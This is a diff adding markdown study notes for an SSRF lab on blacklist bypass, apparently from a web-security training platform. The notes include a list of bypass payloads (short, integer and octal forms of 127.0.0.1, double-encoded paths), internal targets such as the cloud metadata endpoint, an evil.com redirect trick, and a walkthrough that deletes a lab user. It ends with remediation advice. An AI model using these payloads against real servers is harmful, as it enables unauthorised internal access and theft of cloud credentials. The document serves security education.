@@ -486,3 +486,163 @@ Resolve DNS → check IP → confirm it’s allowed.
 > If you can control even one URL parameter → you control the server’s internal browser → scan & attack the entire internal network.
 
 ---
+
+# ⭐ SSRF Lab-3 – Blacklist Filter Bypass (Alternate IPs + Double Encoding)
+
+---
+
+## 🟩 1. ONE LINE SUMMARY
+Bypass SSRF blacklist filters using **alternate IP formats (127.1)** and **double-encoding (%2561dmin)** to access the internal admin panel and delete a user.
+
+---
+
+## 🟦 2. WHAT IS THIS TOPIC?
+This topic is about **Server-Side Request Forgery (SSRF)** where the web app tries to block dangerous internal URLs using a **blacklist** such as:
+
+- `localhost`
+- `127.0.0.1`
+- `/admin`
+
+Attackers easily bypass this by using:
+- Alternate IP notations  
+- Encoded paths  
+- Double URL encoding  
+
+---
+
+## 🟪 3. WHY THIS MATTERS?
+Blacklists DO NOT WORK.
+
+Attackers can still reach:
+- Internal admin dashboards  
+- Cloud metadata APIs  
+- Debug endpoints  
+- Internal microservices  
+
+A blacklist always misses some alternate form.  
+A skilled attacker only needs ONE bypass to gain internal access.
+
+---
+
+## 🟫 4. REAL-WORLD SCENARIOS
+### 🔹 Scenario 1 — WAF blocks localhost, attacker uses 127.1  
+WAF blocks:
+- `localhost`
+- `127.0.0.1`  
+
+Attacker uses:
+```
+http://127.1/admin
+```
+
+### 🔹 Scenario 2 — Keyword "admin" is blocked, attacker double-encodes
+```
+/%2561dmin
+```
+Decoder: `%25` → `%` → `%61` → `a` → becomes `/admin`.
+
+### 🔹 Scenario 3 — Redirect-based SSRF bypass  
+Attacker redirects via:
+```
+evil.com/redirect → 302 → http://127.1/admin
+```
+Server follows redirect → bypass win.
+
+### 🔹 Scenario 4 — Alternate encodings of internal IP  
+Integer form:
+```
+http://2130706433/
+```
+
+Octal form:
+```
+http://017700000001/
+```
+
+Metadata accessed anyway.
+
+---
+
+## 🟥 5. COMMON SSRF BLACKLIST BYPASS PAYLOADS
+```
+127.1
+127.0.1
+127.00.00.01
+2130706433
+017700000001
+%2561dmin
+%2e%2e%2fadmin
+```
+
+---
+
+## 🟧 6. HIGH VALUE INTERNAL ENDPOINTS
+```
+127.1/admin
+127.1/dashboard
+localhost/manager/html
+169.254.169.254/latest/meta-data/
+127.1/debug
+127.1/actuator/env
+127.1:5000/api/internal
+```
+
+---
+
+## 🟨 7. LAB WALKTHROUGH (STEP-BY-STEP)
+
+### 🔸 Step 1 — Open product → Check Stock  
+Intercept request → **Send to Repeater**.
+
+### 🔸 Step 2 — Try localhost (blocked)
+```
+http://127.0.0.1/
+```
+Response: ❌ Blocked by blacklist.
+
+### 🔸 Step 3 — Bypass using short IP  
+```
+http://127.1/
+```
+Response: ✅ Works.
+
+### 🔸 Step 4 — Try admin (blocked)
+```
+http://127.1/admin
+```
+Response: ❌ Keyword "admin" blocked.
+
+### 🔸 Step 5 — Double encode “a” → bypass blacklist  
+```
+/admin  
+a → %61  
+Double encoded: %2561
+```
+
+Final path:
+```
+http://127.1/%2561dmin
+```
+
+### 🔸 Step 6 — Delete Carlos  
+```
+http://127.1/%2561dmin/delete?username=carlos
+```
+Send → User deleted → Lab solved.
+
+---
+
+## 🟩 8. EVIDENCE (SCREENSHOT)
+![SSRF Blacklist Bypass Screenshot](../images/ssrf-blacklist-bypass.png)
+
+---
+
+## 🟦 9. REMEDIATION
+- ❗ Replace blacklist with **strict allowlist**
+- Restrict outbound traffic from server  
+- Block **ALL** internal IP ranges (RFC1918)  
+- Disable redirects  
+- Validate URL AFTER DNS + after redirect  
+- Enforce egress firewall rules  
+
+---
